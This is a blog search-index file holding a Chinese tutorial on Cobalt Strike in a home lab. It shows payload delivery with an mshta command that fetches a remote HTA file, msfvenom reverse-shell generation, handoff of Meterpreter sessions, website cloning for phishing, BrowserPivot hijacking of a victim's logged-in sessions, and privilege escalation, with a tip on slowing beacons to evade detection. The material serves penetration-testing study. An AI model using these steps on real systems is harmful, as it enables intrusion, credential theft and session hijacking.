<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Cobaltstrike</title>
    <url>/2020/07/03/Cobaltstrike/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h1><h2 id="CobaltStrike基础"><a href="#CobaltStrike基础" class="headerlink" title="CobaltStrike基础"></a>CobaltStrike基础</h2><h4 id="关于CobaltStrike"><a href="#关于CobaltStrike" class="headerlink" title="关于CobaltStrike"></a>关于CobaltStrike</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</span><br><span class="line">CobaltStrike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</span><br></pre></td></tr></table></figure>
<p>Cobaltstrike可自定义的部分</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cobalt Strike可以使用 AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等。</span><br><span class="line">Cobalt Strike通信配置文件是 Malleable C2，可以修改CS的通讯特征，Beacon payload的一些行为。</span><br><span class="line">Cobalt Strike可以引用其他的通讯框架ExternalC2，ExternalC2是由Cobalt Strike提出的一套规范&#x2F;框架，它允许黑客根据需要对框架提供的默认HTTP(S)&#x2F;DNS&#x2F;SMB C2 通信通道进行扩展。</span><br></pre></td></tr></table></figure>
<h4 id="Cobaltstrike目录"><a href="#Cobaltstrike目录" class="headerlink" title="Cobaltstrike目录"></a>Cobaltstrike目录</h4><p>目录：</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200623222055788.png" alt="image-20200623222055788.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">agscript 拓展应用的脚本</span><br><span class="line">c2lint 用于检查profile的错误异常</span><br><span class="line">teamserver 服务端程序</span><br><span class="line">cobaltstrike，cobaltstrike.jar客户端程序(java跨平台)</span><br><span class="line">logs 目录记录与目标主机的相关信息</span><br><span class="line">update，update.jar用于更新CS</span><br><span class="line">third-party 第三方工具</span><br><span class="line">start.sh 客户端启动脚本</span><br></pre></td></tr></table></figure>
<p> 最核心的就是teamserver和cobaltstrike.jar，分别是服务端和客户端。</p>
<h4 id="使用Cobaltstrike"><a href="#使用Cobaltstrike" class="headerlink" title="使用Cobaltstrike"></a>使用Cobaltstrike</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.首先给teamserver权限：</span><br><span class="line">chmod 777 teamserver</span><br><span class="line">2.启动，第一个参数是地址，第二个参数是密码，地址是服务端的地址，密码任意设置。</span><br><span class="line"> .&#x2F;teamserver xx.xxx.xx.x password</span><br><span class="line">3.打开客户端</span><br><span class="line"> .&#x2F;start.sh</span><br></pre></td></tr></table></figure>
<p>启动后界面如图：</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200623215837657.png" alt="image-20200623215837657.png"></p>
<p>此处的端口默认为50050，如果更改了teamserver文件里的server_port值那么在此处就需要改成对应的。</p>
<p>连接进去后：</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200623222213228.png" alt></p>
<p><strong>先简单走一遍木马上线</strong></p>
<p>首先创建一个listener，左上角cobaltstrike–&gt;listeners</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624202233213.png" alt="image-20200624202233213"></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624202329852.png" alt="image-20200624202329852"></p>
<p>payload主要分为beacon和foreign两大类。Beacon为内置的Listener，即在目标主机执行相应的payload，获取shell到CS上；其中包含DNS、HTTP、SMB。</p>
<p>Foreign为外部结合的Listener，常用于MSF的结合，例如获取meterpreter到MSF上。</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624202551269.png" alt="image-20200624202551269"></p>
<p>下面选择攻击途径，选中html application，采用html应用的途径攻击。</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624202658222.png" alt></p>
<p>选择方法，分别是可执行文件，powershell，vb程序，这里选择powershell</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624202751335.png" alt="image-20200624202751335"></p>
<p>点击generate生成，选择存放路径</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624202903898.png" alt="image-20200624202903898"></p>
<p>然后利用web服务，打开通道</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624203106791.png" alt="image-20200624203106791"></p>
<p>在file一行选中前面生成的hta文件的路径。</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624203225279.png" alt="image-20200624203225279"></p>
<p>点击launch即可生成链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.12.135:80&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure>
<p> 这条链接就是用于执行本次攻击.</p>
<p>打开win7靶机，打开cmd，执行mshta命令。mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;172.16.12.135:80&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure>
<p>此时回到kali中，可以看到靶机已经上线</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624203653055.png" alt="image-20200624203653055"></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624203741794.png" alt="image-20200624203741794"></p>
<p>在eventlog中可以看到相关日志</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624203825761.png" alt="image-20200624203825761"></p>
<p>选中这条记录，右键点击interact，即可与靶机进行交互</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624204002558.png" alt="image-20200624204002558"></p>
<p>进行shell交互，只需要输入shell “命令”即可</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624204452497.png" alt></p>
<h4 id="各个模块简介"><a href="#各个模块简介" class="headerlink" title="各个模块简介"></a>各个模块简介</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CobaltStrike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624204709917.png" alt="image-20200624204709917"></p>
<p>new connection 新建立一个用户连接，即连接到一个新的teamserver上。</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624204828986.png" alt></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624204845245.png" alt></p>
<p>  Preferences 配置自己的设置。</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624205135146.png" alt></p>
<p>Visualization可视化。</p>
<p> pivot graph：控制主机视图 </p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624205312828.png" alt></p>
<p> session table ：会话视图</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624205350008.png" alt="image-20200624205350008"></p>
<p> Target table：目标表</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624205427113.png" alt="image-20200624205427113"></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624205623348.png" alt="image-20200624205623348"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Vpn lnterfaces ：vpn接口，一般在公网环境下很实用</span><br><span class="line">listeners ：建立个反弹shell的监听器</span><br><span class="line">Script manager 用于脚本管理，CS可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等</span><br></pre></td></tr></table></figure>
<p>创建listener之后，是选择攻击方式：</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624205925400.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTML Application：生成hta文件</span><br><span class="line">MS Office Macro：宏office文件</span><br><span class="line">Payload Generator：生成各种语言版本的payload</span><br><span class="line">Windows Executable payload：生成可执行文件 (一般使用这个)</span><br><span class="line">Windows Executable (S)：把包含payload,Stageless生成可执行文件</span><br></pre></td></tr></table></figure>
<p>生成文件之后就是该投递文件了，也就是创建一个渠道，能够让靶机下载执行生成的恶意文件。</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624210350484.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CS支持的方式包括：</span><br><span class="line">Manage 开启的所有web服务</span><br><span class="line">Clone site 克隆网站</span><br><span class="line">Host File 提供Web以供下载某文件</span><br><span class="line">Scripted Web Delivery 为payload提供web服务以便于下载和执行</span><br><span class="line">Signed Applet Attack 启动一个Web服务以提供自签名JavaApplet的运行环境</span><br><span class="line">Smart Applet Attack 自动检测Java版本并利用已知的exploits绕过security</span><br><span class="line">System Profiler 获取系统，Flash，浏览器版本等</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624210729697.png" alt></p>
<p>第三个菜单是SpearPhish，即鱼叉式网络钓鱼。</p>
<p>在以上线主机会话，右键interact可以开启beacon，可以用它来执行各种命令</p>
<p>在Cobalt Strike中它的心跳默认是60s，默认60s一次回传，这会让我们执行的命令响应很慢，在下载文件面前更为明显，所以实验时会把时间降低一点。但是在实战时应根据实战环境来调节，建议不要太快，不然流量特征会过于明显，容易暴露自己。</p>
<p>设置为如下，让靶机每5s下载一次任务：</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624211057336.png" alt="image-20200624211057336"></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624211142583.png" alt="image-20200624211142583"></p>
<p>会话右键的功能：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Interact 打开beacon</span><br></pre></td></tr></table></figure>
<p>Access：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dumphashes 获取hash</span><br><span class="line">Elevate 提权</span><br><span class="line">GoldenTicket 生成黄金票据注入当前会话</span><br><span class="line">MAketoken  凭证转换</span><br><span class="line">RunMimikatz  运行Mimikatz</span><br><span class="line">SpawnAs 用其他用户生成CobaltStrike侦听器</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624212142221.png" alt></p>
<p>Explore:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BrowserPivot 劫持目标浏览器进程</span><br><span class="line">Desktop(VNC)  桌面交互</span><br><span class="line">FileBrowser  文件浏览器</span><br><span class="line">NetView 命令Net View</span><br><span class="line">Portscan 端口扫描</span><br><span class="line">Processlist 进程列表</span><br><span class="line">screenshot 截屏</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624212401816.png" alt></p>
<p>Pivoting：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SOCKS Server 代理服务</span><br><span class="line">Listener  反向端口转发</span><br><span class="line">DeployVPN 部署VPN</span><br></pre></td></tr></table></figure>
<p>Spawn 派生新的通讯模式并生成会话</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624212548018.png" alt></p>
<p>Session 会话管理，删除，心跳时间，退出，备注。</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200624212654228.png" alt></p>
<p>很多常用功能在view里选中够都能直接使用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Applications 用于显示System Profiler获取的目标浏览器，操作系统，flash版本</span><br><span class="line">Credentials 显示所有已经获取的用户主机hash</span><br><span class="line">Downloads 显示下载的文件</span><br><span class="line">Event log 事件日志记录团队 目标上线等记录</span><br><span class="line">Keystrokes 目标键盘记录</span><br><span class="line">Proxy Pivots 代理信息</span><br><span class="line">Screenshots 屏幕截图</span><br><span class="line">Script Console 加载自定义脚本</span><br><span class="line">Targets 显示所有主机</span><br><span class="line">Web log  web服务日志</span><br></pre></td></tr></table></figure>
<p>这些选项直接打开是没有用的，得在beacon中执行相应命令后才能使用。</p>
<h4 id="与msf交互派生shell"><a href="#与msf交互派生shell" class="headerlink" title="与msf交互派生shell"></a>与msf交互派生shell</h4><p><strong>一、Cobalt strike派生shell给metasploit</strong></p>
<p>首先在metasploit处创建一个handler (Metasploit的exploit/multi/handler模块是一个有效负载处理程序,它只处理在受损主机中执行的有效负载连接。</p>
<p>在kali中执行“msfconsole”，启动metasploit。</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625202014366.png" alt></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625202103140.png" alt></p>
<p>启动后输入如下图命令，用于在metasploit处创建一个handler。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 172.16.12.135</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625202848116.png" alt></p>
<p>接下来使用cobaltstrike创建一个listener</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625203014797.png" alt></p>
<p>启动cobaltstrike</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625203909870.png" alt="image-20200625203909870"></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625204106793.png" alt="image-20200625204106793"></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625204215728.png" alt="image-20200625204215728"></p>
<p>新建监听</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625204351548.png" alt="image-20200625204351548"></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625204603432.png" alt="image-20200625204603432"></p>
<p>先生成恶意文件，注意，这里是针对test这个listenr，不要搞错了</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625204759067.png" alt="image-20200625204759067"></p>
<p>然后web driver by-&gt;host file</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625204937547.png" alt="image-20200625204937547"></p>
<p>点击launch即可,切换到win7靶机，输入命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;172.16.12.137:80&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure>
<p>切回kali，可以看到靶机已上线：</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625205245503.png" alt="image-20200625205245503"></p>
<p>下一步派生会话</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625205414116.png" alt="image-20200625205414116"></p>
<p>选择msf的listener</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625205559497.png" alt="image-20200625205559497"></p>
<p>此时就拿到了meterpreter</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625210340348.png" alt="image-20200625210340348"></p>
<p><strong>二、metasploit派生会话给Cobaltstrike</strong></p>
<p>cobalt派生shell给metasploit，同样的，metasploit也可以派生shell给cobalt strike。</p>
<p>首先在cobaltstrike创建一个listenr，等会用于接收msf派生的shell：</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625210741841.png" alt="image-20200625210741841"></p>
<p>接下来启动msf,通过msf得拿到meterpreter。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先用msfvenom生成恶意文件:</span><br><span class="line">msfvenom  -p  windows&#x2F;meterpreter&#x2F;reverse_tcp  lhost&#x3D;172.16.12.135  lport&#x3D;4444  -f  exe  -o  test.exe</span><br><span class="line">然后开启监听:</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625211533398.png" alt></p>
<p>将生成的test.exe拷到win7靶机中，进行执行，获取到meterpreter</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625212312077.png" alt="image-20200625212312077"></p>
<p> 将其切换到后台，然后使用下面的模块，功能是注入一个新的payload 到当前的session里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625212516697.png" alt="image-20200625212516697"></p>
<p>设置其他选项，这里的payload设置为reverse_http，是因为前面cobalt strike的也是reverse_http,lport也要和CS的相同</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set lhost 172.16.12.137（cobaltatrike IP）</span><br><span class="line">set lport 5555 （cobaltstrike监听端口）</span><br><span class="line">set seesion 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625214105555.png" alt="image-20200625214105555"></p>
<p>然后执行</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625214203173.png" alt="image-20200625214203173"></p>
<p>此时cobaltstrike拿到了metasploit派生的shell了</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625214239474.png" alt="image-20200625214239474"></p>
<h4 id="AggressorScript"><a href="#AggressorScript" class="headerlink" title="AggressorScript"></a>AggressorScript</h4><p><strong>一、简介</strong></p>
<p>CobaltStrike强大的可扩展性注定了它在渗透工具中的地位，这些扩展脚本实际上都是使用Aggressor Script写的，Aggressor Script基于Sleep，一种由Raphael Mudge（也是Cobalt Strike的作者）创建的语言。</p>
<p>直接从拿到beacon开始:</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625221314363.png" alt="image-20200625221314363"></p>
<p>从GitHub clone第三方脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;harleyQu1nn&#x2F;AggressorScripts.git</span><br></pre></td></tr></table></figure>
<p>Cobalt strike-&gt;script manager</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625221902177.png" alt="image-20200625221902177"></p>
<p>比如导入一个processcolor.cna，下图的ready打钩就说明导入成功可以使用了</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625222026863.png" alt="image-20200625222026863"></p>
<p>使用ps命令看下效果，不同的进程会显示不同的颜色：</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625222247314.png" alt="image-20200625222247314"></p>
<p>导入RedTeamRepo.cna试下：</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625222348361.png" alt="image-20200625222348361"></p>
<p>用法如下</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625222532884.png" alt="image-20200625222532884"></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625222555218.png" alt="image-20200625222555218"></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625222626311.png" alt="image-20200625222626311"></p>
<p>这些扩展脚本实际上都是使用Aggressor Script写的，Aggressor Script基于Sleep，一种由Raphael Mudge（也是Cobalt Strike的作者）创建的语言。 Sleep基本上是一种在JVM上运行的类似Perl的语言。</p>
<p>在cs中view-&gt;script console，打开script控制台之后与其进行交互，我们可以在这儿跟踪，配置，调试和管理脚本。输入help可以查看帮助</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625222823103.png" alt="image-20200625222823103"></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625222923820.png" alt="image-20200625222923820"></p>
<p>具体的参数及用法如下表所示</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625223027582.png" alt="image-20200625223027582"></p>
<p>首先以helloword为例，写一个完整的脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先用subhello&#123;&#125;创建一个名为hello的函数</span><br><span class="line">然后打印消息到控制台println(“hello world!”);</span><br></pre></td></tr></table></figure>
<p>注意语句使用分号结尾，并且必须在调用函数之前定义函数。因为hello不接收任何参数，所以直接使用hello()调用。</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625224251376.png" alt></p>
<p>使用load加载cna脚本所在位置</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625224501743.png" alt></p>
<p>也可以直接在脚本窗口使用一句话实现这个功能：</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625224733048.png" alt></p>
<p>输出我们已经学会了，那么我们可以输入吗？我们接下来要实现能够输出hello,xx的功能。</p>
<p>需要使用command关键字注册命令，这样我们就可以允许脚本通过控制台从用户接收触发器。</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625225006780.png" alt></p>
<p>这段代码注册命令hello，脚本控制台会自动解析命令的参数。加载测试看看：</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625225130272.png" alt="image-20200625225130272"></p>
<p>使用hello命令，传入mys3t，打印出了hello mys3t，实现了与cs的交互功能。</p>
<p><strong>二、sleep语言中的各种数据类型以及如何使用</strong></p>
<p> Sleep中的数据类型主要是字符串，数组和hash，字符串用$表示，数组用@表示，hash用％表示。</p>
<p>字符串包含字符或字符串; 数组可以包含多个字符串、数组或hash（可以在数组中混合类型）; 和散列包含多个键值对。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例子：</span><br><span class="line">e $string &#x3D; &quot;This is a string.&quot;;</span><br><span class="line">e @array &#x3D; @(&quot;This first element.&quot;,2,$string);</span><br><span class="line">e %hash &#x3D; %(key1 &#x3D;&gt; &quot;vlaue&quot;,key2 &#x3D;&gt; @array,key3 &#x3D;&gt; $string);</span><br></pre></td></tr></table></figure>
<p>如何访问数组和hash中的数字。首先，数组中包含的数据可以通过其索引或其在数组中的位置来访问，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e @array &#x3D; @(&quot;First&quot;,&quot;Second&quot;,&quot;Third&quot;);</span><br><span class="line">x @array[0]</span><br><span class="line">x @array[1]</span><br></pre></td></tr></table></figure>
<p>还可以使用println直接打印这些值，”.”符号将两个值连接起来:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e println(&quot;The first value is:&quot;.@array[0]);</span><br></pre></td></tr></table></figure>
<p>  Hash也是类似的方式，不过使用的是键，而不是索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e %hash &#x3D; %(key1 &#x3D;&gt; &quot;value1&quot;,key2 &#x3D;&gt; &quot;value2&quot;,key3 &#x3D;&gt; &quot;value3&quot;);</span><br><span class="line">x %hash[&#39;key1&#39;]</span><br></pre></td></tr></table></figure>
<p>Cobalt Strike的核心是Cobalt Strike数据模型。 这是我们可访问的所有信息的地方，它为我们提供了大量数据，用于CobaltStrike中的自动化操作。 数据模型中收集的数据包括有关当前beacon的信息，从受感染系统收集的凭据，屏幕截图，下载的文件以及许多其他内容。</p>
<p>我们可以使用beacons()函数（Aggressor中的内置函数）获取所有当前连接的beacon的数组。 我们可以在脚本控制台中使用x beacons()查看此信息，我们会得到有关每个beacon的大量信息。 beacon以数组排列，每个beacon作为哈希存储在该数组中。 这就是数据模型中单个beacon的样子</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200625230524018.png" alt="image-20200625230524018"></p>
<h2 id="Cobaltstrike钓鱼与劫持"><a href="#Cobaltstrike钓鱼与劫持" class="headerlink" title="Cobaltstrike钓鱼与劫持"></a>Cobaltstrike钓鱼与劫持</h2><h4 id="网站克隆劫持"><a href="#网站克隆劫持" class="headerlink" title="网站克隆劫持"></a>网站克隆劫持</h4><p>钓鱼攻击是社会工程学攻击的一种方式。钓鱼攻击使用电子邮件或者恶意网站引诱人们提供个人信息(用户名、密码、金融信息等)。</p>
<p>前提是靶机上线，在cs中获取靶机权限</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627105102846.png" alt="image-20200627105102846"></p>
<p>选中会话后右键Interact,打开beacon console，为快速显示结果，将sleep设置为0</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627105134958.png" alt="image-20200627105134958"></p>
<p>接下来克隆网站， Attacks-&gt;web driver by -&gt;clone site</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627105345933.png" alt="image-20200627105345933"></p>
<p>  Clone url输入要克隆的网页的地址，Local port最好不要输80，避免冲突</p>
<p> 点击clone</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627105435156.png" alt="image-20200627105435156"></p>
<p>接下来在win上输入上面给出的url，可以看到这是克隆了dvwa登录界面的钓鱼网页</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627105513687.png" alt="image-20200627105513687"></p>
<p>输入用户名、密码，然后在cobaltstrike中调出web log</p>
<p>此处失败，没有成功获取web log里的密码。</p>
<h4 id="BrowserPivot"><a href="#BrowserPivot" class="headerlink" title="BrowserPivot"></a>BrowserPivot</h4><p>Browser Pivot是一个针对IE浏览器的技术，利用的是IE的cookie机制，Cobalt Strike通过IE注入进程以继承用户的已验证Web会话，达到无需验证登录用户访问的网站。在实际的渗透过程中，用户登录的邮箱，后台管理以及其他的业务系统，也都可以利用此方法来进行登录，在远程用户没有察觉的情况下，获取到我们所需要的信息。 </p>
<p>前提依然是已经拿到靶机权限</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627111454699.png" alt="image-20200627111454699"></p>
<p>Browser Pivot是一个针对IE浏览器的技术，利用的是IE的cookie机制。所以我们切换到windows上，打开IE浏览器访问dvwa。</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627111618860.png" alt="image-20200627111618860"></p>
<p>输入用户名、密码进入登录后的界面</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627111822523.png" alt="image-20200627111822523"></p>
<p>接下来，通过Browser pivot来直接登录受害者登录的网站。</p>
<p> 操作如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用ps命令找到浏览器进程</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627111944827.png" alt="image-20200627111944827"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">然后注入进程，选中控制会话后右键explore-&gt;Browser Pivot</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627112058806.png" alt="image-20200627112058806"></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627112213750.png" alt="image-20200627112213750"></p>
<p>选择一个后面打钩的,因为我们需要插入Internet Explorer以继承用户的已验证Web会话。IE的新版本会为每个选项卡生成一个进程，我们必须将其插入子选项卡以继承会话状态。通常，子选项卡共享所有会话状态。通过查看PPID值来标识IE子选项卡进程，当PPID引用explorer.exe时，该进程不是子选项卡；当PPID引用iexplore.exe时，该进程就是子选项卡。Cobalt Strike也自动为我们选择了最佳的注入进程。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">选中后点击launch</span><br></pre></td></tr></table></figure>
<p>此时在beacon shell中会显示http代理服务器的信息</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627113044989.png" alt></p>
<p>不设置代理的情况，kali上访问win上搭的dvwa，但是会自动跳转到下图的登录界面</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627114216896.png" alt="image-20200627114216896"></p>
<p>接下来打开kali上的火狐设置本地浏览器代理，在设置中找到network proxy，选择手动设置，设置为cs给出的地址和端口</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627120016695.png" alt="image-20200627120016695"></p>
<p>设置好后点击ok， 然后访问win中同样的网址http[:]//172.16.12.136/index.php,已经自动登录了</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627120201199.png" alt="image-20200627120201199"></p>
<p> 要关闭代理的话可以输入命令browserpivot stop。</p>
<h2 id="Cobaltstrike权限维持"><a href="#Cobaltstrike权限维持" class="headerlink" title="Cobaltstrike权限维持"></a>Cobaltstrike权限维持</h2><h4 id="提权及spawn"><a href="#提权及spawn" class="headerlink" title="提权及spawn"></a>提权及spawn</h4><p>除了使用cs自带的提权exp进行提权，事实上我们可以使用外部准备好的exp来提权。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第三方提权攻击库：ElevateKit</span><br><span class="line">下载到kali：git clone https:&#x2F;&#x2F;github.com&#x2F;rsmudge&#x2F;ElevateKit.git</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627153234208.png" alt="image-20200627153234208"></p>
<p>选中后右键Interact，打开beacon console， 通过elevate-kit高效提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在beacon shell中输入elevate</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627153746186.png" alt="image-20200627153746186"></p>
<p>这是cs自带的, 接下来我们可以导入cna文件丰富我们的漏洞库</p>
<p> 点击左上角cobalt strike-&gt;script manager</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627153457951.png" alt="image-20200627153457951"></p>
<p> 点击load,找到下载的ElevateKit工具路径，选择cna文件</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627153526469.png" alt="image-20200627153526469"></p>
<p>通过右键-&gt;access-&gt;elevate</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627154926418.png" alt="image-20200627154926418"></p>
<p>点击launch，在beacon shell中会有回显信息</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627155017172.png" alt="image-20200627155017172"></p>
<p>根据回显可知已经提权成功</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627155046277.png" alt="image-20200627155046277"></p>
<p>派生场景：</p>
<p>假如你同事跟你说，他需要你那个目标的shell，但又不想直接连到你的团队服务器上。事实上，这个场景非常常见，cs针对这种场景的解决办法就是：让他直接在他本地起一个团队服务器创建个监听器，然后你再用你的cobaltstrike客户端连到他的团队服务器上，最后，把他要那个目标的shell派生到他指定的那个监听器上即可。</p>
<p>第一步，另开一台kali</p>
<p>在新开kali上启动teamserver：</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627163733140.png" alt="image-20200627163733140"></p>
